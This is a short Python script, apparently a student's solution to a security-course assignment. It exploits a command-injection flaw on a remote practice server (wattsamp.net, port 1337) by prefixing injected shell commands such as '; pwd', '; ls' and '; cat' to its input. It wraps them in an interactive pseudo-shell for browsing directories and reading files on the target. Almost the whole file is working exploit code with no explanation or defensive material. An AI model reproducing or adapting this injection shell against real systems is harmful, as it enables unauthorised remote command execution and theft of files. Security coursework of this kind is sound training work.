"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time

host = "wattsamp.net" # IP address here
port = 1337 # Port here
pwd = ""

def execute_cmd(cmd, arg1, arg2):
    global pwd
    # Establish socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.setblocking(True)

    data = s.recv(1024).decode()     # Receives 1024 bytes from IP/Port

    cmd_inject = ""

    if cmd == "shell" or cmd == "pwd":
        cmd_inject = "; pwd"
    elif cmd == "ls":
        cmd_inject = "; cd " + pwd + "; ls"
    elif cmd == "cd":
        cmd_inject = "; cd " + pwd + "; cd " + arg1 + "; pwd"
    elif cmd == "pull" or cmd == "cat":
        cmd_inject = "; cd " + pwd + "; cat " + arg1
    

    s.send((cmd_inject + "\n").encode())
    data = s.recv(1024).decode()     # Receives 1024 bytes from IP/Port

    if cmd == "shell" or cmd == "cd":
        pwd = data.strip()
    elif cmd == "pwd" or cmd == "ls" or cmd == "cat":
        print(data.strip())


if __name__ == '__main__':
    execute_cmd("shell", "", "")
    while True:
        raw = input(pwd + " $ ")
        split_by_semicolon = raw.split(";")
        for raw_cmd in split_by_semicolon:
            parsed = raw_cmd.split()
            cmd = parsed[0]

            arg1 = ""
            arg2 = ""
            if len(parsed) > 1:
                arg1 = parsed[1]
            if len(parsed) > 2:
                arg2 = parsed[2]

            execute_cmd(cmd, arg1, arg2)

